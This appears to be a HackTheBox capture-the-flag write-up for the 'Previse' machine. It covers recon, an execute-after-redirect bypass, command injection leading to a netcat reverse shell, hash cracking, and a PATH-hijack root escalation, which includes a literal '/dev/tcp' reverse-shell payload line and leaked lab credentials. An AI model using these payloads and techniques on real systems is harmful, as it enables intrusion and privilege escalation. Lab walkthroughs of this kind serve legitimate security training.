
![Image Previse](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/Previse.png)

## -------------->> Previse <<----------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.11.104
-----

    Nmap scan report for 10.129.214.117
    Host is up (0.32s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
    |   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
    |_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    | http-title: Previse Login
    |_Requested resource was login.php
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


// Lets search some directories with [dirsearch](https://github.com/maurosoria/dirsearch)(By maurosoria)

    $ python3 dirsearch.py -u http://10.10.11.104/ -t 100 

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 10903

    Output File: /home/kali/Desktop/Tools/dirsearch/reports/10.129.214.117/_21-08-10_20-00-52.txt

    Error Log: /home/kali/Desktop/Tools/dirsearch/logs/errors-21-08-10_20-00-52.log

    Target: http://10.10.11.104/ 

    [20:00:52] Starting: 
    [20:00:59] 301 -  313B  - /js  ->  http://10.10.11.104/js/
    [20:01:00] 403 -  279B  - /.ht_wsr.txt
    [20:01:00] 403 -  279B  - /.htaccess.bak1
    [20:01:00] 403 -  279B  - /.htaccess.orig
    [20:01:00] 403 -  279B  - /.htaccess.save
    [20:01:00] 403 -  279B  - /.htaccess_orig
    [20:01:00] 403 -  279B  - /.htaccessBAK
    [20:01:00] 403 -  279B  - /.htaccess_extra
    [20:01:00] 403 -  279B  - /.htaccess.sample
    [20:01:00] 403 -  279B  - /.htaccess_sc
    [20:01:00] 403 -  279B  - /.htaccessOLD2
    [20:01:00] 403 -  279B  - /.htaccessOLD
    [20:01:00] 403 -  279B  - /.html
    [20:01:00] 403 -  279B  - /.htm
    [20:01:00] 403 -  279B  - /.htpasswd_test
    [20:01:00] 403 -  279B  - /.httr-oauth
    [20:01:00] 403 -  279B  - /.htpasswds
    [20:01:02] 403 -  279B  - /.php
    [20:01:12] 302 -    4KB - /accounts.php  ->  login.php
    [20:01:28] 200 -    0B  - /config.php
    [20:01:29] 301 -  314B  - /css  ->  http://10.10.11.104/css/
    [20:01:31] 302 -    0B  - /download.php  ->  login.php
    [20:01:34] 200 -   15KB - /favicon.ico
    [20:01:34] 302 -    5KB - /files.php  ->  login.php
    [20:01:34] 200 -  217B  - /footer.php
    [20:01:35] 200 -  980B  - /header.php
    [20:01:37] 302 -    3KB - /index.php  ->  login.php
    [20:01:37] 302 -    3KB - /index.php/login/  ->  login.php
    [20:01:38] 200 -    1KB - /js/
    [20:01:40] 200 -    2KB - /login.php
    [20:01:40] 302 -    0B  - /logout.php  ->  login.php
    [20:01:51] 403 -  279B  - /server-status
    [20:01:51] 403 -  279B  - /server-status/
    [20:01:53] 302 -    3KB - /status.php  ->  login.php

// Navigating to most interesting directory - /accounts.php , redirects us to /login.php

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/1.png)

// So, since /accounts.php is the most interesting file, i open BurpSuite and capture this request and send it to Reapter

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/3.png)

// Its seems that we get the wanted request in Burp, BUT, the status is 302 so its redirects us

// tring to see the page accounts.php i have copied the HTML code from the response html file to see the content

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/2.png)

// So now we can see that if we get this page we're basically loged in

// Also we could see that in BurpSuite reapter when change the response to render

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/4.png)

// In BurpSuite u have an option to edit the request

// Right clicking on the request and select 'Do intercept' then 'Response to this request'

![Image 1.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/1.1.jpg)

// Click 'forward', and now we can edit the status from '302 to '200'(Legitimate)

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/5.png)

// And we're in !

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/6.png)

// Now we can create ourselfs an account 

// In BurpSuite the request will look like this:

![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/7.png)

// Go back to /login.php and login with our new account

![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/8.png)

// When searching for juicy information in the tabs, we can see in files tab zipped file called 'SITEBACKUP.zip'

![Image 9](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/9.png)

// Lets download it and see what we can get out of it

    $ unzip siteBackup.zip 

    Archive:  siteBackup.zip
      inflating: accounts.php            
      inflating: config.php              
      inflating: download.php            
      inflating: file_logs.php           
      inflating: files.php               
      inflating: footer.php              
      inflating: header.php              
      inflating: index.php               
      inflating: login.php               
      inflating: logout.php              
      inflating: logs.php                
      inflating: nav.php                 
      inflating: status.php              

// I will serach the strings contain the characters 'pass' 

    $ cd siteBackup/
    $ cat status.php | grep pass
    $ cat nav.php | grep pass
    $ cat download.php | grep pass
    $ cat logs.php | grep pass
    $ cat login.php | grep pass
    
            $password = $_POST['password'];
            } elseif (empty(trim($_POST['password']))) {
                    $passHash = $users['password'];
                    if (crypt($password, '$1$🧂llol$') == $passHash) {
                    <input type="password" name="password" class="uk-input" placeholder="Password" required>
                    
    $ cat config.php | grep pass

        $passwd = 'mySQL_p@ssw0rd!:)';
        $mycon = new mysqli($host, $user, $passwd, $db);



    $cat config.php 
    ....
    <?php

    function connectDB(){
        $host = 'localhost';
        $user = 'root';
        $passwd = 'mySQL_p@ssw0rd!:)';
        $db = 'previse';
        $mycon = new mysqli($host, $user, $passwd, $db);
        return $mycon;
    }

    ?>
    ....

// So, we found mysql credentials(in config.php) and the way that the passwords encrypted(in login.php)

// Lets move on, in the website that we login there is another tab called 'MANAGMENT MENU' -> 'LOG DATA'

![Image 10](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/10.png)

// its seems that its some kind of communicating way with the server

// Taking the request to BurpSuite we can see the content

![Image 11](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/11.png)

// Lets try manipulate this with chaniging the 'delim=' param to our needs

// First lets URL encode our inject syntax with [CyberChef](https://gchq.github.io/CyberChef/)

![Image 12](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/12.png)

// And add it to the request

![Image 13](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/13.png)

// The site was hang on for a minute and didnt respond 

// So, i opend wireshark on interface tun0 and searching for ICMP(ping) packets

// And send our modified request again

![Image 14](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/14.png)

// It worked !! we can see that the server ping our host

// So, we know now that we can communicate directly with the server 

// Lets step up to a reverse shell using nc

![Image 15](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Previce/15.png)

// Open a listiner on our machine and send a modified request with nc encoded command

    $ nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.6] from (UNKNOWN) [10.10.11.104] 51856
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

// We got shell !!!

// We can upgrade our shell with python(if exist)

    which python
    /usr/bin/python
    python -c "import pty;pty.spawn('/bin/sh')"
    $ 

// Great!, move on...

// As www-data user we dont have permissions on the user

// Since we got mysql credentials earlier lets see what we can get 

// This [website](https://dev.mysql.com/doc/mysql-getting-started/en/) helped me a lot to navigate in the mysql DataBase

    $ mysql -u root -p previse                         
    mysql -u root -p previse
    Enter password: mySQL_p@ssw0rd!:)

------

    mysql> show databases;
    show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | mysql              |
    | performance_schema |
    | previse            |
    | sys                |
    +--------------------+
    5 rows in set (0.00 sec)

    mysql> show databases;
    show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | mysql              |
    | performance_schema |
    | previse            |
    | sys                |
    +--------------------+
    5 rows in set (0.00 sec)

    mysql> use previse;
    use previse;
    Database changed
    mysql> show tables;
    show tables;
    +-------------------+
    | Tables_in_previse |
    +-------------------+
    | accounts          |
    | files             |
    +-------------------+
    2 rows in set (0.00 sec)

    mysql> describe accounts;
    describe accounts;
    +------------+--------------+------+-----+-------------------+----------------+
    | Field      | Type         | Null | Key | Default           | Extra          |
    +------------+--------------+------+-----+-------------------+----------------+
    | id         | int(11)      | NO   | PRI | NULL              | auto_increment |
    | username   | varchar(50)  | NO   | UNI | NULL              |                |
    | password   | varchar(255) | NO   |     | NULL              |                |
    | created_at | datetime     | YES  |     | CURRENT_TIMESTAMP |                |
    +------------+--------------+------+-----+-------------------+----------------+
    4 rows in set (0.00 sec)

    mysql> select * from accounts;
    select * from accounts;
    +----+----------+------------------------------------+---------------------+
    | id | username | password                           | created_at          |
    +----+----------+------------------------------------+---------------------+
    |  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
    |  2 | W0lfysec | $1$🧂llol$rCfLNVEV/lMn6ru.fXs/a1 | 2021-09-09 12:46:25 |
    +----+----------+------------------------------------+---------------------+
    2 rows in set (0.00 sec)

// We got user 'm4lwhere' hash

// we can crack it using john using format: md5crypt-long 

    $ john hash.txt --wordlist=../../../../../../htb/wordlists--/rockyou.txt --format=md5crypt-long 
    Using default input encoding: UTF-8
    Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    ilovecody112235! (?)
    1g 0:00:53:13 DONE (2021-09-09 10:38) 0.000313g/s 2321p/s 2321c/s 2321C/s ilovecodydean..ilovecody..
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed

// We got 'm4lwhere' user password !!

    m4lwhere : ilovecody112235!
    
// We can try to SSH to the machine now

// And we got user flag !!!

    $ ssh m4lwhere@10.10.11.104
-------

    m4lwhere@10.10.11.104's password: 
    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

    m4lwhere@previse:~$ ls
    user.txt
    m4lwhere@previse:~$ cat user.txt 
    fdd1e6...............


### -------Privilleges Escalation--------

// Lets run 'sudo -l' to check wich sudo privilleges we have

    m4lwhere@previse:~$ sudo -l
    [sudo] password for m4lwhere: 
    User m4lwhere may run the following commands on previse:
        (root) /opt/scripts/access_backup.sh
        
// Its seems we can run 'access_backup.sh' with sudo privilleges

// lets check this file

    m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
    #!/bin/bash

    # We always make sure to store logs, we take security SERIOUSLY here

    # I know I shouldnt run this as root but I cant figure it out programmatically on my account
    # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

    gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
    gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz

// We can execute path injection

// Lets check the current path of gzip

    m4lwhere@previse:~$ which gzip
    /bin/gzip

// Now we will make our malicious(Reverse shell) gzip file in /tmp folder

// and inject /tmp to PATH 

    m4lwhere@previse:~$ cd /tmp/
    m4lwhere@previse:/tmp$ echo "bash -i >& /dev/tcp/10.10.16.6/1444 0>&1" > gzip  
    m4lwhere@previse:/tmp$ chmod +x gzip 
    m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH 
    m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh

// and we got root flag !

    root@previse:/root# cat root.txt
    cat root.txt
    a74e70.................
    
